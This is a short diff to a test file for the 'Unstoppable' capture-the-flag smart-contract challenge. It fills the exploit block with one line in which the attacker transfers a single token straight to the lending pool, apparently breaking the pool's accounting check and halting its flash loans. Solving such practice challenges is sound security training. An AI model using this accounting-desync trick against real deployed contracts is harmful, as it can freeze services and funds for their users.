@@ -23,6 +23,7 @@ describe('[Challenge] Unstoppable', function () {
         await this.pool.depositTokens(TOKENS_IN_POOL);
 
         await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        
 
         expect(
             await this.token.balanceOf(this.pool.address)
@@ -40,6 +41,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
+
     });
 
     after(async function () {
